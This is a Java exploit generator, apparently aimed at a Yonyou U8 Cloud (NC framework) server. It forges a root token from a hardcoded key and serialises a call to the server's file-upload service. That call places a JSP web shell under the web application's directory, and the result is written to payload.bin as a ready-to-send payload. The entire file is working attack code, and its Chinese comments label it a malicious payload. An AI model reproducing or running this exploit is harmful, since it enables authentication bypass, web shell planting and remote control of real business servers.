package org.le1a;

import nc.bs.framework.common.InvocationInfo;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.MessageDigest;
import nc.bs.framework.comn.NetObjectOutputStream;
import nc.bs.framework.exception.FrameworkRuntimeException;
import nc.bs.framework.server.token.MD5Util;
import nc.ui.hr.tools.zip.ZipUtil;

public class Main {
    public static void main(String[] args) throws Exception {
        // 1. 准备恶意参数
        byte[] shellContent = Files.readAllBytes(Paths.get("result.jsp"));
        // 使用ZipUtil.compress压缩
        byte[] compressedShell = ZipUtil.compress(shellContent);
        String remotePath = "webapps/u8c_web/result.jsp";

        // 2. 创建 InvocationInfo 对象
        InvocationInfo maliciousInvocation = new InvocationInfo(
                "",
                "nc.itf.hr.tools.IFileTrans",
                "uploadFile",
                new Class[] { byte[].class, String.class },
                new Object[] { compressedShell, remotePath }
        );
        maliciousInvocation.setUserCode("root");
        maliciousInvocation.setToken(genToken("root"));


        // 3. 使用NetObjectOutputStream序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        NetObjectOutputStream noos = new NetObjectOutputStream(baos);
        noos.writeObject(maliciousInvocation);
        noos.close();

        byte[] serializedData = baos.toByteArray();

        // 4. 按照readObject格式写入文件：[长度] + [NetObjectOutputStream序列化的数据]
        FileOutputStream fos = new FileOutputStream("payload.bin");
        DataOutputStream dos = new DataOutputStream(fos);

        // 写入数据长度
        dos.writeInt(serializedData.length);
        // 写入NetObjectOutputStream序列化的数据
        dos.write(serializedData);
        dos.close();
        fos.close();

        System.out.println("恶意负载已生成");
    }

    public static String genToken(String userCode) {
        byte[] md5 = md5("ab7d823e-03ef-39c1-9947-060a0a08b931".getBytes(), userCode.getBytes());
        return MD5Util.byteToHexString(md5);
    }

    private static byte[] md5(byte[] key, byte[] tokens) {
        MessageDigest md = null;

        try {
            md = MessageDigest.getInstance("SHA-1");
            md.update(tokens);
            md.update(key);
            return md.digest();
        } catch (Exception e) {
            throw new FrameworkRuntimeException("md5 error", e);
        }
    }
}

